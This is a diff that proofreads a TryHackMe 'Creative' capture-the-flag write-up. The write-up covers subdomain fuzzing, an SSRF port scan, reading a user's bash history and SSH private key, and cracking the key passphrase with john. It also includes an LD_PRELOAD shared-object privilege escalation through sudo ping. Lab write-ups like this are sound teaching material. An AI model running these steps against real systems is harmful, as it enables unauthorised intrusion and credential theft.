@@ -78,7 +78,7 @@ From here I proceeded the analysis port by port.
 
 ## Port 80 Analysis
 
-When I accessed the webserver my browser got redirect to the dns name `creative.thm`. I added the name in my `hosts` file an proceed. Because of the hostname, I started with a subdomain enumeration:
+When I accessed the webserver, my browser was redirected to the DNS name `creative.thm`. I added the name to my `hosts` file an proceed. Due to the hostname, I started with a subdomain enumeration:
 
 ```bash
  ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.creative.thm" -u http://10.10.222.5/ -fs 178
@@ -108,11 +108,11 @@ When I accessed the webserver my browser got redirect to the dns name `creative.
   beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 45ms]
 ```
 
-I found a subdomain which showed an URL Tester:
+I found a subdomain that displayed a URL Tester:
 
 ![URL tester](/assets/img/tryhackme/Creative/thm_creative_1.jpg)
 
-I started with the local website `http://127.0.0.1/` and the website got loaded. This seemed to be a Server-Side Request Forgery (SSRF) vulnerability, so I checked if I were able to reach another internal system on a different port. I used ffuf to fuzz localhost and all ports up to 65535. I created a port list using `seq` as the wordlist for ffuf.
+I started with the local website `http://127.0.0.1/`, and it loaded successfully. This appeared to be a Server-Side Request Forgery (SSRF) vulnerability, so I checked whether I could reach another internal system on a different port. I used ffuf to fuzz localhost and all ports up to 65535. I created a port list using `seq` as the wordlist for ffuf.
 
 ```bash
 $ seq 65535 > ports.txt
@@ -145,11 +145,11 @@ $ ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: appli
   1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 78ms]
 ```
 
-Ffuf identified an interesting port. I started checking the `1337` which revealed a directory listing from the server:
+Ffuf identified an interesting port. I started by checking port `1337`, which revealed a directory listing on the server:
 
 ![Directory browsing](/assets/img/tryhackme/Creative/thm_creative_2.jpg)
 
-Since I had some initial access to the system I enumerated the files and directories for gaining a better access. I found the `.bash_history` in the `/home/saad` directory. The user stored his credentials in a file:
+Since I had some initial access to the system, I enumerated the files and directories to gain better access. I found the `.bash_history` in the `/home/saad` directory. The user had stored their credentials in a file:
 ```bash
 [...]
 sudo -l
@@ -158,7 +158,7 @@ rm creds.txt
 [...]
 ```
 
-I tried to use this to connect with SSH, but got an error because of my public key. I searched for `saad's` private key and found it under `/home/saad/.ssh/id_rsa`. After downloading the key I stored it in a file called `id_rsa`. For the SSH connection I needed the password for the key. I used `ssh2john` to retrieve the key hash and stored it in a file. With john and the rockyou.txt wordlist, I was able to crack the password. After that I was able to login with SSH and retrieved the user flag:
+I tried using this to connect via SSH, but received an error due to my public key. I searched for `Saad's` private key and found it under `/home/saad/.ssh/id_rsa`. After downloading the key, I saved it in a file called `id_rsa`. To establish the SSH connection, I needed the password for the key. I used `ssh2john` to retrieve the key hash and stored it in a file. Using john and the rockyou.txt wordlist, I was able to crack the password. After that, I was able to log in via SSH and retrieved the user flag:
 ```bash
 $ nano id_rsa
 $ ssh2john id_rsa > hash
@@ -192,7 +192,7 @@ $ sudo -l
       (root) /usr/bin/ping
 ```
 
-The tool `ping` itself won't help that much on its own, but in combination with `env_keep+=LD_PRELOAD` it did. First I created a file called shell.c with the following content:
+The tool `ping` itself wouldn't be of much help, but in combination with `env_keep+=LD_PRELOAD`, it was. First, I created a file called shell.c with the following content:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -211,7 +211,7 @@ Then I compiled it as a shared object using `gcc`:
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 
-I was able to specify the `LD_PRELOAD` to point to my shared object, started a ping using `sudo` and became root. From there I was able to retrieve the root flag:
+I was able to specify the `LD_PRELOAD` to point to my shared object, started a ping using `sudo`, and became root. From there I was able to retrieve the root flag:
 ```bash
 $ sudo LD_PRELOAD=/home/saad/shell.so /usr/bin/ping
 root@m4lware:/home/saad# cd /root
